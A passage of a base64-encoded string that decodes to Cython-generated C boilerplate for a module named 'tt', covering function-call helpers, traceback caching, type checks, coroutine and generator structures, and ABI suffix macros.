qZWN0ICogX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX08oUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzZiwgUHlPYmplY3QgKmt3bmFtZXMpO1xuc3RhdGljIFB5T2JqZWN0ICogX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0ZBU1RDQUxMX0tFWVdPUkRTKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBuYXJnc2YsIFB5T2JqZWN0ICprd25hbWVzKTtcbnN0YXRpYyBQeU9iamVjdCAqIF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9GQVNUQ0FMTF9LRVlXT1JEU19NRVRIT0QoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzZiwgUHlPYmplY3QgKmt3bmFtZXMpO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl9mdW5jX3ZlY3RvcmNhbGwoZikgKCgoX19weXhfQ3lGdW5jdGlvbk9iamVjdCopZiktPmZ1bmNfdmVjdG9yY2FsbClcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fZnVuY192ZWN0b3JjYWxsKGYpICgoKFB5Q0Z1bmN0aW9uT2JqZWN0KilmKS0+dmVjdG9yY2FsbClcbiNlbmRpZlxuI2VuZGlmXG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9DeUZ1bmN0aW9uX05ldyhQeU1ldGhvZERlZiAqbWwsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludCBmbGFncywgUHlPYmplY3QqIHF1YWxuYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqY2xvc3VyZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKm1vZHVsZSwgUHlPYmplY3QgKmdsb2JhbHMsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0KiBjb2RlKTtcblxuXG4jaWYgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDSyAmJiBDWVRIT05fQ0xJTkVfSU5fVFJBQ0VCQUNLX1JVTlRJTUVcbnN0YXRpYyBpbnQgX19QeXhfQ0xpbmVGb3JUcmFjZWJhY2soUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBpbnQgY19saW5lKTtcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X0NMaW5lRm9yVHJhY2ViYWNrKHRzdGF0ZSwgY19saW5lKSAgKCgoQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDSykpID8gY19saW5lIDogMClcbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG50eXBlZGVmIFB5T2JqZWN0IF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlO1xuI2Vsc2VcbnR5cGVkZWYgUHlDb2RlT2JqZWN0IF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlO1xuI2VuZGlmXG50eXBlZGVmIHN0cnVjdCB7XG4gICAgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGUqIGNvZGVfb2JqZWN0O1xuICAgIGludCBjb2RlX2xpbmU7XG59IF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5O1xuc3RydWN0IF9fUHl4X0NvZGVPYmplY3RDYWNoZSB7XG4gICAgaW50IGNvdW50O1xuICAgIGludCBtYXhfY291bnQ7XG4gICAgX19QeXhfQ29kZU9iamVjdENhY2hlRW50cnkqIGVudHJpZXM7XG4gICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElOR1xuICAgIF9fcHl4X2F0b21pY19pbnRfdHlwZSBhY2Nlc3Nvcl9jb3VudDtcbiAgI2VuZGlmXG59O1xuc3RhdGljIGludCBfX3B5eF9iaXNlY3RfY29kZV9vYmplY3RzKF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5KiBlbnRyaWVzLCBpbnQgY291bnQsIGludCBjb2RlX2xpbmUpO1xuc3RhdGljIF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlICpfX3B5eF9maW5kX2NvZGVfb2JqZWN0KGludCBjb2RlX2xpbmUpO1xuc3RhdGljIHZvaWQgX19weXhfaW5zZXJ0X2NvZGVfb2JqZWN0KGludCBjb2RlX2xpbmUsIF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlKiBjb2RlX29iamVjdCk7XG5cblxuc3RhdGljIHZvaWQgX19QeXhfQWRkVHJhY2ViYWNrKGNvbnN0IGNoYXIgKmZ1bmNuYW1lLCBpbnQgY19saW5lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludCBweV9saW5lLCBjb25zdCBjaGFyICpmaWxlbmFtZSk7XG5cblxuI2lmICFkZWZpbmVkKF9fSU5URUxfQ09NUElMRVIpICYmIGRlZmluZWQoX19HTlVDX18pICYmIChfX0dOVUNfXyA+IDQgfHwgKF9fR05VQ19fID09IDQgJiYgX19HTlVDX01JTk9SX18gPj0gNikpXG4jZGVmaW5lIF9fUHl4X0hBU19HQ0NfRElBR05PU1RJQ1xuI2VuZGlmXG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5TG9uZ19Gcm9tX2xvbmcobG9uZyB2YWx1ZSk7XG5cblxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbnR5cGVkZWYgUHlPYmplY3QgKl9fUHl4X1R5cGVOYW1lO1xuI2RlZmluZSBfX1B5eF9GTVRfVFlQRU5BTUUgIiVVIlxuI2RlZmluZSBfX1B5eF9ERUNSRUZfVHlwZU5hbWUob2JqKSBQeV9YREVDUkVGKG9iailcbiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDBcbiNkZWZpbmUgX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZSBQeVR5cGVfR2V0RnVsbHlRdWFsaWZpZWROYW1lXG4jZWxzZVxuc3RhdGljIF9fUHl4X1R5cGVOYW1lIF9fUHl4X1B5VHlwZV9HZXRGdWxseVF1YWxpZmllZE5hbWUoUHlUeXBlT2JqZWN0KiB0cCk7XG4jZW5kaWZcbiNlbHNlICAvLyAhTElNSVRFRF9BUElcbnR5cGVkZWYgY29uc3QgY2hhciAqX19QeXhfVHlwZU5hbWU7XG4jZGVmaW5lIF9fUHl4X0ZNVF9UWVBFTkFNRSAiJS4yMDBzIlxuI2RlZmluZSBfX1B5eF9QeVR5cGVfR2V0RnVsbHlRdWFsaWZpZWROYW1lKHRwKSAoKHRwKS0+dHBfbmFtZSlcbiNkZWZpbmUgX19QeXhfREVDUkVGX1R5cGVOYW1lKG9iailcbiNlbmRpZlxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGxvbmcgX19QeXhfUHlMb25nX0FzX2xvbmcoUHlPYmplY3QgKik7XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5TG9uZ19Bc19pbnQoUHlPYmplY3QgKik7XG5cblxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuI2RlZmluZSBfX1B5eF9UeXBlQ2hlY2sob2JqLCB0eXBlKSBfX1B5eF9Jc1N1YnR5cGUoUHlfVFlQRShvYmopLCAoUHlUeXBlT2JqZWN0ICopdHlwZSlcbiNkZWZpbmUgX19QeXhfVHlwZUNoZWNrMihvYmosIHR5cGUxLCB0eXBlMikgX19QeXhfSXNBbnlTdWJ0eXBlMihQeV9UWVBFKG9iaiksIChQeVR5cGVPYmplY3QgKil0eXBlMSwgKFB5VHlwZU9iamVjdCAqKXR5cGUyKVxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X0lzU3VidHlwZShQeVR5cGVPYmplY3QgKmEsIFB5VHlwZU9iamVjdCAqYik7XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfSXNBbnlTdWJ0eXBlMihQeVR5cGVPYmplY3QgKmNscywgUHlUeXBlT2JqZWN0ICphLCBQeVR5cGVPYmplY3QgKmIpO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhQeU9iamVjdCAqZXJyLCBQeU9iamVjdCAqdHlwZSk7XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzMihQeU9iamVjdCAqZXJyLCBQeU9iamVjdCAqdHlwZTEsIFB5T2JqZWN0ICp0eXBlMik7XG4jZWxzZVxuI2RlZmluZSBfX1B5eF9UeXBlQ2hlY2sob2JqLCB0eXBlKSBQeU9iamVjdF9UeXBlQ2hlY2sob2JqLCAoUHlUeXBlT2JqZWN0ICopdHlwZSlcbiNkZWZpbmUgX19QeXhfVHlwZUNoZWNrMihvYmosIHR5cGUxLCB0eXBlMikgKFB5T2JqZWN0X1R5cGVDaGVjayhvYmosIChQeVR5cGVPYmplY3QgKil0eXBlMSkgfHwgUHlPYmplY3RfVHlwZUNoZWNrKG9iaiwgKFB5VHlwZU9iamVjdCAqKXR5cGUyKSlcbiNkZWZpbmUgX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGVyciwgdHlwZSkgUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGVyciwgdHlwZSlcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMyKFB5T2JqZWN0ICplcnIsIFB5T2JqZWN0ICp0eXBlMSwgUHlPYmplY3QgKnR5cGUyKSB7XG4gICAgcmV0dXJuIFB5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhlcnIsIHR5cGUxKSB8fCBQeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoZXJyLCB0eXBlMik7XG59XG4jZW5kaWZcbiNkZWZpbmUgX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlczIoZXJyMSwgZXJyMikgIF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlczIoX19QeXhfUHlFcnJfQ3VycmVudEV4Y2VwdGlvblR5cGUoKSwgZXJyMSwgZXJyMilcbiNkZWZpbmUgX19QeXhfUHlFeGNlcHRpb25fQ2hlY2sob2JqKSBfX1B5eF9UeXBlQ2hlY2sob2JqLCBQeUV4Y19FeGNlcHRpb24pXG4jaWZkZWYgUHlFeGNlcHRpb25JbnN0YW5jZV9DaGVja1xuICAjZGVmaW5lIF9fUHl4X1B5QmFzZUV4Y2VwdGlvbl9DaGVjayhvYmopIFB5RXhjZXB0aW9uSW5zdGFuY2VfQ2hlY2sob2JqKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9QeUJhc2VFeGNlcHRpb25fQ2hlY2sob2JqKSBfX1B5eF9UeXBlQ2hlY2sob2JqLCBQeUV4Y19CYXNlRXhjZXB0aW9uKVxuI2VuZGlmXG5cblxuI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMGIwMDAwXG5zdGF0aWMgdW5zaWduZWQgbG9uZyBfX1B5eF9jYWNoZWRfcnVudGltZV92ZXJzaW9uID0gMDtcbnN0YXRpYyB2b2lkIF9fUHl4X2luaXRfcnVudGltZV92ZXJzaW9uKHZvaWQpO1xuI2Vsc2VcbiNkZWZpbmUgX19QeXhfaW5pdF9ydW50aW1lX3ZlcnNpb24oKVxuI2VuZGlmXG5zdGF0aWMgdW5zaWduZWQgbG9uZyBfX1B5eF9nZXRfcnVudGltZV92ZXJzaW9uKHZvaWQpO1xuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9QeUl0ZXJfTmV4dF9QbGFpbihQeU9iamVjdCAqaXRlcmF0b3IpO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwQTAwMDBcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfR2V0QnVpbHRpbk5leHRfTGltaXRlZEFQSSh2b2lkKTtcbiNlbmRpZlxuXG5cbnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDEoUHlPYmplY3QqIG9iaiwgUHlPYmplY3QqIG1ldGhvZF9uYW1lLCBQeU9iamVjdCogYXJnKTtcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X1JldHVybldpdGhTdG9wSXRlcmF0aW9uKFB5T2JqZWN0KiB2YWx1ZSwgaW50IGFzeW5jLCBpbnQgaXRlcm5leHQpO1xuXG5cbnN0cnVjdCBfX3B5eF9Db3JvdXRpbmVPYmplY3Q7XG50eXBlZGVmIFB5T2JqZWN0ICooKl9fcHl4X2Nvcm91dGluZV9ib2R5X3QpKHN0cnVjdCBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKiwgUHlUaHJlYWRTdGF0ZSAqLCBQeU9iamVjdCAqKTtcbiNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLXG4jZGVmaW5lIF9fUHl4X0V4Y0luZm9TdHJ1Y3QgIF9QeUVycl9TdGFja0l0ZW1cbiNlbHNlXG50eXBlZGVmIHN0cnVjdCB7XG4gICAgUHlPYmplY3QgKmV4Y190eXBlO1xuICAgIFB5T2JqZWN0ICpleGNfdmFsdWU7XG4gICAgUHlPYmplY3QgKmV4Y190cmFjZWJhY2s7XG59IF9fUHl4X0V4Y0luZm9TdHJ1Y3Q7XG4jZW5kaWZcbnR5cGVkZWYgc3RydWN0IF9fcHl4X0Nvcm91dGluZU9iamVjdCB7XG4gICAgUHlPYmplY3RfSEVBRFxuICAgIF9fcHl4X2Nvcm91dGluZV9ib2R5X3QgYm9keTtcbiAgICBQeU9iamVjdCAqY2xvc3VyZTtcbiAgICBfX1B5eF9FeGNJbmZvU3RydWN0IGdpX2V4Y19zdGF0ZTtcbiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQzAwMDAgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5T2JqZWN0ICpnaV93ZWFrcmVmbGlzdDtcbiNlbmRpZlxuICAgIFB5T2JqZWN0ICpjbGFzc29iajtcbiAgICBQeU9iamVjdCAqeWllbGRmcm9tO1xuICAgIF9fUHl4X3B5aXRlcl9zZW5kZnVuYyB5aWVsZGZyb21fYW1fc2VuZDtcbiAgICBQeU9iamVjdCAqZ2lfbmFtZTtcbiAgICBQeU9iamVjdCAqZ2lfcXVhbG5hbWU7XG4gICAgUHlPYmplY3QgKmdpX21vZHVsZW5hbWU7XG4gICAgUHlPYmplY3QgKmdpX2NvZGU7XG4gICAgUHlPYmplY3QgKmdpX2ZyYW1lO1xuI2lmIENZVEhPTl9VU0VfU1lTX01PTklUT1JJTkcgJiYgKENZVEhPTl9QUk9GSUxFIHx8IENZVEhPTl9UUkFDRSlcbiAgICBQeU1vbml0b3JpbmdTdGF0ZSBfX3B5eF9weW1vbml0b3Jpbmdfc3RhdGVbX19QeXhfTW9uaXRvcmluZ0V2ZW50VHlwZXNfQ3lHZW5fY291bnRdO1xuICAgIHVpbnQ2NF90IF9fcHl4X3B5bW9uaXRvcmluZ192ZXJzaW9uO1xuI2VuZGlmXG4gICAgaW50IHJlc3VtZV9sYWJlbDtcbiAgICBjaGFyIGlzX3J1bm5pbmc7XG59IF9fcHl4X0Nvcm91dGluZU9iamVjdDtcbnN0YXRpYyBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fUHl4X19Db3JvdXRpbmVfTmV3KFxuICAgIFB5VHlwZU9iamVjdCAqdHlwZSwgX19weXhfY29yb3V0aW5lX2JvZHlfdCBib2R5LCBQeU9iamVjdCAqY29kZSwgUHlPYmplY3QgKmNsb3N1cmUsXG4gICAgUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpxdWFsbmFtZSwgUHlPYmplY3QgKm1vZHVsZV9uYW1lKTtcbnN0YXRpYyBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fUHl4X19Db3JvdXRpbmVfTmV3SW5pdChcbiAgICAgICAgICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuLCBfX3B5eF9jb3JvdXRpbmVfYm9keV90IGJvZHksIFB5T2JqZWN0ICpjb2RlLCBQeU9iamVjdCAqY2xvc3VyZSxcbiAgICAgICAgICAgIFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqcXVhbG5hbWUsIFB5T2JqZWN0ICptb2R1bGVfbmFtZSk7XG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0Nvcm91dGluZV9FeGNlcHRpb25DbGVhcihfX1B5eF9FeGNJbmZvU3RydWN0ICpzZWxmKTtcbnN0YXRpYyBpbnQgX19QeXhfQ29yb3V0aW5lX2NsZWFyKFB5T2JqZWN0ICpzZWxmKTtcbnN0YXRpYyBfX1B5eF9QeVNlbmRSZXN1bHQgX19QeXhfQ29yb3V0aW5lX0FtU2VuZChQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqKnJldHZhbCk7XG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0Nvcm91dGluZV9TZW5kKFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqdmFsdWUpO1xuc3RhdGljIF9fUHl4X1B5U2VuZFJlc3VsdCBfX1B5eF9Db3JvdXRpbmVfQ2xvc2UoUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICoqcmV0dmFsKTtcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ29yb3V0aW5lX1Rocm93KFB5T2JqZWN0ICpnZW4sIFB5T2JqZWN0ICphcmdzKTtcbiNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLXG4jZGVmaW5lIF9fUHl4X0Nvcm91dGluZV9Td2FwRXhjZXB0aW9uKHNlbGYpXG4jZGVmaW5lIF9fUHl4X0Nvcm91dGluZV9SZXNldEFuZENsZWFyRXhjZXB0aW9uKHNlbGYpICBfX1B5eF9Db3JvdXRpbmVfRXhjZXB0aW9uQ2xlYXIoJihzZWxmKS0+Z2lfZXhjX3N0YXRlKVxuI2Vsc2VcbiNkZWZpbmUgX19QeXhfQ29yb3V0aW5lX1N3YXBFeGNlcHRpb24oc2VsZikge1xcXG4gICAgX19QeXhfRXhjZXB0aW9uU3dhcCgmKHNlbGYpLT5naV9leGNfc3RhdGUuZXhjX3R5cGUsICYoc2VsZiktPmdpX2V4Y19zdGF0ZS5leGNfdmFsdWUsICYoc2VsZiktPmdpX2V4Y19zdGF0ZS5leGNfdHJhY2ViYWNrKTtcXFxuICAgIF9fUHl4X0Nvcm91dGluZV9SZXNldEZyYW1lQmFja3BvaW50ZXIoJihzZWxmKS0+Z2lfZXhjX3N0YXRlKTtcXFxuICAgIH1cbiNkZWZpbmUgX19QeXhfQ29yb3V0aW5lX1Jlc2V0QW5kQ2xlYXJFeGNlcHRpb24oc2VsZikge1xcXG4gICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoKHNlbGYpLT5naV9leGNfc3RhdGUuZXhjX3R5cGUsIChzZWxmKS0+Z2lfZXhjX3N0YXRlLmV4Y192YWx1ZSwgKHNlbGYpLT5naV9leGNfc3RhdGUuZXhjX3RyYWNlYmFjayk7XFxcbiAgICAoc2VsZiktPmdpX2V4Y19zdGF0ZS5leGNfdHlwZSA9IChzZWxmKS0+Z2lfZXhjX3N0YXRlLmV4Y192YWx1ZSA9IChzZWxmKS0+Z2lfZXhjX3N0YXRlLmV4Y190cmFjZWJhY2sgPSBOVUxMO1xcXG4gICAgfVxuI2VuZGlmXG4jaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFXG4jZGVmaW5lIF9fUHl4X1B5R2VuX0ZldGNoU3RvcEl0ZXJhdGlvblZhbHVlKHB2YWx1ZSlcXFxuICAgIF9fUHl4X1B5R2VuX19GZXRjaFN0b3BJdGVyYXRpb25WYWx1ZShfX3B5eF90c3RhdGUsIHB2YWx1ZSlcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5R2VuX0ZldGNoU3RvcEl0ZXJhdGlvblZhbHVlKHB2YWx1ZSlcXFxuICAgIF9fUHl4X1B5R2VuX19GZXRjaFN0b3BJdGVyYXRpb25WYWx1ZShfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQsIHB2YWx1ZSlcbiNlbmRpZlxuc3RhdGljIGludCBfX1B5eF9QeUdlbl9fRmV0Y2hTdG9wSXRlcmF0aW9uVmFsdWUoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqKnB2YWx1ZSk7XG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0Nvcm91dGluZV9SZXNldEZyYW1lQmFja3BvaW50ZXIoX19QeXhfRXhjSW5mb1N0cnVjdCAqZXhjX3N0YXRlKTtcbnN0YXRpYyBjaGFyIF9fUHl4X0Nvcm91dGluZV90ZXN0X2FuZF9zZXRfaXNfcnVubmluZyhfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbik7XG5zdGF0aWMgdm9pZCBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbik7XG5zdGF0aWMgY2hhciBfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmcoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4pO1xuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmdfZ2V0dGVyKFB5T2JqZWN0ICpnZW4sIHZvaWQgKmNsb3N1cmUpO1xuI2lmIF9fUFlYX0hBU19QWV9BTV9TRU5EID09IDJcbnN0YXRpYyB2b2lkIF9fUHl4X1NldEJhY2twb3J0VHlwZUFtU2VuZChQeVR5cGVPYmplY3QgKnR5cGUsIF9fUHl4X1B5QXN5bmNNZXRob2RzU3RydWN0ICpzdGF0aWNfYW1zZW5kX21ldGhvZHMsIF9fUHl4X3B5aXRlcl9zZW5kZnVuYyBhbV9zZW5kKTtcbiNlbmRpZlxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9Db3JvdXRpbmVfZmFpbF9yZWR1Y2VfZXgoUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICphcmcpO1xuXG5cbiNkZWZpbmUgX19QeXhfR2VuZXJhdG9yX1VTRURcbiNkZWZpbmUgX19QeXhfR2VuZXJhdG9yX0NoZWNrRXhhY3Qob2JqKSBfX1B5eF9JU19UWVBFKG9iaiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfR2VuZXJhdG9yVHlwZSlcbiNkZWZpbmUgX19QeXhfR2VuZXJhdG9yX05ldyhib2R5LCBjb2RlLCBjbG9zdXJlLCBuYW1lLCBxdWFsbmFtZSwgbW9kdWxlX25hbWUpXFxcbiAgICBfX1B5eF9fQ29yb3V0aW5lX05ldyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9HZW5lcmF0b3JUeXBlLCBib2R5LCBjb2RlLCBjbG9zdXJlLCBuYW1lLCBxdWFsbmFtZSwgbW9kdWxlX25hbWUpXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dlbmVyYXRvcl9OZXh0KFB5T2JqZWN0ICpzZWxmKTtcbnN0YXRpYyBpbnQgX19weXhfR2VuZXJhdG9yX2luaXQoUHlPYmplY3QgKm1vZHVsZSk7XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfR2VuZXJhdG9yX0dldElubGluZWRSZXN1bHQoUHlPYmplY3QgKnNlbGYpO1xuXG5cbnN0YXRpYyBpbnQgX19QeXhfY2hlY2tfYmluYXJ5X3ZlcnNpb24odW5zaWduZWQgbG9uZyBjdF92ZXJzaW9uLCB1bnNpZ25lZCBsb25nIHJ0X3ZlcnNpb24sIGludCBhbGxvd19uZXdlcik7XG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9EZWNvbXByZXNzU3RyaW5nKGNvbnN0IGNoYXIgKnMsIFB5X3NzaXplX3QgbGVuZ3RoLCBpbnQgYWxnbyk7XG5cblxuI2lmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVCAmJiBDWVRIT05fVVNFX01PRFVMRV9TVEFURVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9TdGF0ZV9GaW5kTW9kdWxlKHZvaWQqKTtcbnN0YXRpYyBpbnQgX19QeXhfU3RhdGVfQWRkTW9kdWxlKFB5T2JqZWN0KiBtb2R1bGUsIHZvaWQqKTtcbnN0YXRpYyBpbnQgX19QeXhfU3RhdGVfUmVtb3ZlTW9kdWxlKHZvaWQqKTtcbiNlbGlmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFXG4jZGVmaW5lIF9fUHl4X1N0YXRlX0ZpbmRNb2R1bGUgUHlTdGF0ZV9GaW5kTW9kdWxlXG4jZGVmaW5lIF9fUHl4X1N0YXRlX0FkZE1vZHVsZSBQeVN0YXRlX0FkZE1vZHVsZVxuI2RlZmluZSBfX1B5eF9TdGF0ZV9SZW1vdmVNb2R1bGUgUHlTdGF0ZV9SZW1vdmVNb2R1bGVcbiNlbmRpZlxuXG5cblxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICAjaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcbiAgICAgICAgI2RlZmluZSBfX1BZWF9GQVNUQ0FMTF9BQklfU1VGRklYICAiX2Zhc3RjYWxsIlxuICAgICNlbHNlXG4gICAgICAgICNkZWZpbmUgX19QWVhfRkFTVENBTExfQUJJX1NVRkZJWFxuICAgICNlbmRpZlxuICAgICNkZWZpbmUgX19QWVhfTElNSVRFRF9BQklfU1VGRklYICJsaW1pdGVkIiBfX1BZWF9GQVNUQ0FMTF9BQklfU1VGRklYIF9fUFlYX0FNX1NFTkRfQUJJX1NVRkZJWFxuI2Vsc2VcbiAgICAjZGVmaW5lIF9fUFlYX0xJTUlURURfQUJJX1NVRkZJWFxuI2VuZGlmXG4jaWYgX19QWVhfSEFTX1BZX0FNX1NFTkQgPT0gMVxuICAgICNkZWZpbmUgX19QWVhfQU1fU0VORF9BQklfU1VGRklYXG4jZWxpZiBfX1BZWF9IQVNfUFlfQU1fU0VORCA9PSAyXG4gICAgI2RlZmluZSBfX1BZWF9BTV9TRU5EX0FCSV9TVUZGSVggImFtc2VuZGJhY2twb3J0IlxuI2Vsc2VcbiAgICAjZGVmaW5lIF9fUFlYX0FNX1NFTkRfQUJJX1NVRkZJWCAibm9hbXNlbmQiXG4jZW5kaWZcbiNpZm5kZWYgX19QWVhfTU9OSVRPUklOR19BQklfU1VGRklYXG4gICAgI2RlZmluZSBfX1BZWF9NT05JVE9SSU5HX0FCSV9TVUZGSVhcbiNlbmRpZlxuI2lmIENZVEhPTl9VU0VfVFBfRklOQUxJWkVcbiAgICAjZGVmaW5lIF9fUFlYX1RQX0ZJTkFMSVpFX0FCSV9TVUZGSVhcbiNlbHNlXG4gICAgI2RlZmluZSBfX1BZWF9UUF9GSU5BTElaRV9BQklfU1VGRklYICJub2ZpbmFsaXplIlxuI2VuZGlmXG4jaWYgQ1lUSE9OX1VTRV9GUkVFTElTVFMgfHwgIWRlZmluZWQoX19QeXhfQXN5bmNHZW5fVVNFRClcbiAgICAjZGVmaW5lIF9fUFlYX0ZSRUVMSVNUU19BQklfU1VGRklYXG4jZWxzZVxuICAgICNkZWZpbmUgX19QWVhfRlJFRUxJU1RTX0FCSV9TVUZGSVggIm5vZnJlZWxpc3RzIlxuI2VuZGlmXG4jZGVmaW5lIENZVEhPTl9BQkkgIF9fUFlYX0FCSV9WRVJTSU9OIF9fUFlYX0xJTUlURURfQUJJX1NVRkZJWCBfX1BZWF9NT05JVE9SSU5HX0FCSV9TVUZGSVggX19QWVhfVFBfRklOQUxJWkVfQUJJX1NVRkZJWCBfX1BZWF9GUkVFTElTVFNfQUJJX1NVRkZJWCBfX1BZWF9BTV9TRU5EX0FCSV9TVUZGSVhcbiNkZWZpbmUgX19QWVhfQUJJX01PRFVMRV9OQU1FICJfY3l0aG9uXyIgQ1lUSE9OX0FCSVxuI2RlZmluZSBfX1BZWF9UWVBFX01PRFVMRV9QUkVGSVggX19QWVhfQUJJX01PRFVMRV9OQU1FICIuIlxuXG5cblxuXG5cbiNkZWZpbmUgX19QeXhfTU9EVUxFX05BTUUgInR0IlxuZXh0ZXJuIGludCBfX3B5eF9tb2R1bGVfaXNfbWFpbl90dDtcbmludCBfX3B5eF9tb2R1bGVfaXNfbWFpbl90dCA9IDA7XG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X2J1aWx0aW5fcHJpbnQ7XG5zdGF0aWMgUHlP